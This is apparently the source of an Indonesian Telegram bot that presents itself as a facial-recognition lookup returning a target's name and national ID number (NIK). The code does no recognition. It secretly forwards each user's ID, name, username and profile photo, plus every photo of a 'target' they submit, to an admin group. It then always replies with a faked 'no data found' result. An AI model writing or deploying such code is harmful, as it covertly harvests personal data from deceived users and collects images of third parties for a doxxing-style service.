import os
import asyncio
import logging
from datetime import datetime
from dotenv import load_dotenv

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# --- SETUP LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
try:
    ADMIN_ID = int(os.getenv("ADMIN_GROUP_ID").strip())
except:
    ADMIN_ID = None

# --- HANDLER START ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    username = f"@{user.username}" if user.username else "Tanpa Username"
    
    # 1. Teks Sambutan User
    welcome_text = (
        "SELAMAT DATANG\n\n"
        "**BOT FR TESTING**\n"
        "(KUOTA 10/DAY)\n\n"
        "**CARA PENGGUNAAN BOT**\n\n"
        "1. SILAHKAN MASUKKAN FOTO TARGET, UPAYAKAN FOTO TAMPAK DEPAN DAN TERLIHAT JELAS.\n\n"
        "2. SISTEM AKAN MELAKUKAN PENGECEKAN FR TARGET DALAM 10MENIT WAKTU TERCEPAT UNTUK MENDAPATKAN HASIL FR AKURASI TINGGI.\n\n"
        "3. BOT AKAN MENAMPILKAN HASIL NAMA, NIK, DAN PERSENTASE KEMIRIPAN DENGAN FOTO TARGET.\n\n"
        "4. BOT BERFUNGSI SAAT SERVER HIDUP DI PUKUL 06.00 WIB SAMPAI DENGAN PUKUL 21.00 WIB.\n\n"
        "5. GUNAKAN AKSES DENGAN BIJAK. TERIMAKASIH\n\n\n"
        "SELAMAT BERTUGAS, SEMOGA SUKSES SELALU"
    )
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

    # 2. LOGIKA KIRIM INFO PROFIL KE GRUP ADMIN
    try:
        if ADMIN_ID:
            # Mengambil foto profil user
            user_photos = await context.bot.get_user_profile_photos(user.id)
            
            caption_admin = (
                f"👤 **PENGGUNA BARU TERDETEKSI**\n\n"
                f"🆔 **ID:** `{user.id}`\n"
                f"📛 **Nama:** {user.full_name}\n"
                f"🌐 **Username:** {username}\n"
                f"🕒 **Waktu:** {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}"
            )

            if user_photos.total_count > 0:
                # Jika user punya foto profil, kirim foto profilnya
                photo_file_id = user_photos.photos[0][-1].file_id
                await context.bot.send_photo(
                    chat_id=ADMIN_ID,
                    photo=photo_file_id,
                    caption=caption_admin,
                    parse_mode='Markdown'
                )
            else:
                # Jika user tidak punya foto profil, kirim teks saja
                await context.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=f"🖼️ *(User tidak memiliki foto profil)*\n\n{caption_admin}",
                    parse_mode='Markdown'
                )
    except Exception as e:
        logger.error(f"Gagal kirim info profil ke admin: {e}")

# --- HANDLER FOTO ---
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    now = datetime.now().hour
    if now < 6 or now > 21:
        await update.message.reply_text("⚠️ Server Offline. Bot hanya aktif pukul 06.00 - 21.00 WIB.")
        return

    user = update.message.from_user
    photo_id = update.message.photo[-1].file_id
    
    await update.message.reply_text("Sedang diproses...")

    try:
        await context.bot.send_photo(
            chat_id=ADMIN_ID,
            photo=photo_id,
            caption=f"📥 **LAPORAN FOTO BARU**\nUser: {user.full_name}\nID: `{user.id}`",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Gagal kirim foto ke admin: {e}")

    await asyncio.sleep(4)
    await update.message.reply_text(
        "*HASIL PENGECEKAN FR*\n\n"
        "Nama : DATA TIDAK DITEMUKAN\n"
        "NIK  : -\n"
        "STATUS : TIDAK ADA DATA",
        parse_mode='Markdown'
    )

if __name__ == '__main__':
    if not TOKEN or not ADMIN_ID:
        print("❌ Konfigurasi .env belum lengkap!")
        exit()

    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))

    print(f"🚀 Bot berjalan... Monitoring Profil Aktif!")
    app.run_polling(drop_pending_updates=True)
